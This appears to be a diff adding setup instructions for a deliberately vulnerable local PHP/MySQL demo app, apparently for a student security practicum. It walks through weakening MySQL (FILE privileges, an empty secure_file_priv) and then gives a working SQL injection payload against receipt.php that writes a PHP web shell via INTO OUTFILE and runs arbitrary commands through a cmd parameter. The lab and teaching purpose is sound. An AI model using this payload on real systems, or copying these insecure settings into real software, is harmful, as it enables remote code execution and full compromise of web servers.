@@ -1,0 +1,119 @@
+# MySQL, Python, and PHP Vulnerable App & RCE Demo Instructions
+
+## 1. Install MySQL (if not already installed)
+
+```
+brew install mysql
+brew services start mysql
+```
+
+## 2. Secure MySQL and Set Root Password
+
+```
+mysql_secure_installation
+```
+- Follow the prompts to set a root password.
+- Allow local root access for demo purposes.
+
+## 3. Log in to MySQL as root
+
+```
+mysql -u root -p
+```
+- Enter the password you set above.
+
+## 4. Ensure root can connect locally
+
+Inside the MySQL shell:
+```
+SELECT Host, User FROM mysql.user WHERE User='root';
+```
+- If 'root'@'localhost' is missing, run:
+```
+CREATE USER 'root'@'localhost' IDENTIFIED BY 'yourpassword';
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+```
+
+## 5. Initialize the Database
+
+From the `app` directory (or provide the full path):
+```
+mysql -u root -p < init_db.sql
+```
+
+## 6. Grant Extra Privileges for RCE (if not already granted)
+
+In the MySQL shell:
+```
+GRANT ALL PRIVILEGES ON payment_db.* TO 'root'@'localhost';
+GRANT FILE, EXECUTE ON *.* TO 'root'@'localhost';
+FLUSH PRIVILEGES;
+```
+
+## 7. Check and Adjust `secure_file_priv` (for file write via SQLi)
+
+In the MySQL shell:
+```
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+- If it returns a path, you can only write files to that directory.
+- To allow writing files anywhere (not recommended for production), edit your MySQL config (e.g., `/opt/homebrew/etc/my.cnf`) and set:
+  ```
+  [mysqld]
+  secure_file_priv=
+  ```
+  Then restart MySQL:
+  ```
+  brew services restart mysql
+  ```
+
+## 8. Install Python Dependencies (for Flask app)
+
+```
+pip install -r requirements.txt
+```
+
+## 9. Run the Flask App (optional, for Python demo)
+
+```
+python app.py
+```
+
+## 10. Set Up the Vulnerable PHP App for Real RCE
+
+### a. Install PHP (if not already installed)
+```
+brew install php
+```
+
+### b. Start the PHP built-in server in the php_app directory:
+```
+cd ../php_app
+php -S localhost:8080
+```
+Access the app at http://localhost:8080
+
+## 11. Achieve Real RCE via SQL Injection (Web Shell)
+
+### a. Ensure `secure_file_priv` is empty (see step 7 above)
+
+### b. Write a PHP web shell using SQL injection or direct SQL:
+From the `php_app` directory:
+```
+mysql -u root -p'root' payment_db -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '$(pwd)/shell.php'"
+```
+
+### c. Access the web shell in your browser:
+```
+http://localhost:8080/shell.php?cmd=whoami
+```
+You can run any system command by changing the `cmd` parameter.
+
+---
+
+Keep this file for future reference when setting up or resetting your environment. Clean up shells after your demo!
+
+
+Payload --
+curl "http://localhost:8080/receipt.php?id=1%3B%20SELECT%20'%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E'%20INTO%20OUTFILE%20'/Users/sid/Documents/CMU/Fall%202025/Practicum/web_app/php_app/shell.php'%20--"
